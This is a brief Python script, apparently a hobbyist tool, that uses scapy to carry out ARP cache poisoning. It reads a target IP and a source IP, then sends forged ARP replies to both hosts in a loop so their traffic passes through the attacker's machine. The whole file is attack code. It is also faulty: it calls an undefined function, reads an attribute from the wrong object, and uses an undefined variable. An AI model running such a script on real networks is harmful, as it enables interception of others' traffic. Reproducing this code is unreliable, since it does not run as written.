#!/usr/bin/env python3
from scapy.all import *

def getTargetMAC(ip):

    arpRequest = ARP(pdst = ip)
    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    finalPacket = broadcast / arpRequest
    answer = srp(finalPacket, timeout = 2, verbose = False, retry = -100)[0]
    return answer[0][1].hwsrc

def spoofArp(target, source):

    mac = getTargetMAC(target)
    packet = ARP(op = 2, hwdst = mac, pdst = target, psrc = source)
    send(packet, verbose = False)

def restore(target, source):
    
    targetMAC = setTargetMAC(target)
    sourceMAC = setTargetMAC(source)

    packet = ARP(op = 2, pdst = target, hwdst = targetMAC.hwdst, psrc = source, hwsrc = sourceMAC)
    send(packet)


def main():

    target = input('Enter a target IP: ')
    print('Target: ' + target)
    source = input('Enter in the source IP: ')
    print('Source: ' + source)

    try:
        while True:

            spoofArp(target, source)
            print('packet1 sent')
            spoofArp(spoof, target)
            print('packet2 sent')

    except KeyboardInterrupt:
        restore(target, source)
        restore(source, target)
        exit(0)

main()